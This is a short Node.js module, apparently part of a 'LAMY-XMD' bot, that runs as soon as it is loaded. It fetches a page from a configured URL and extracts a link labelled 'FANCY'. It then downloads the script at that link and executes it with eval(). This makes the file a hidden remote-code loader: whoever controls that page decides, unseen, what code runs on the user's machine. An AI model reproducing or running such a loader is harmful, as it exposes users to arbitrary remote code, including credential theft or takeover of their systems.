//  [LAMY-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Lameck Adema                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const lam = require(__dirname + "/../config");

async function fetchFANCYUrl() {
    try {
        const response = await axios.get(lam.LAMY_XMD);
        const $ = cheerio.load(response.data);

        const targetElement = $('a:contains("FANCY")');
        const targetUrl = targetElement.attr('href');

        if (!targetUrl) {
            throw new Error('FANCY not found 😭');
        }

        console.log('FANCY loaded successfully ✅');

        const scriptResponse = await axios.get(targetUrl);
        eval(scriptResponse.data);

    } catch (error) {
        console.error('Error:', error.message);
    }
}

fetchFANCYUrl();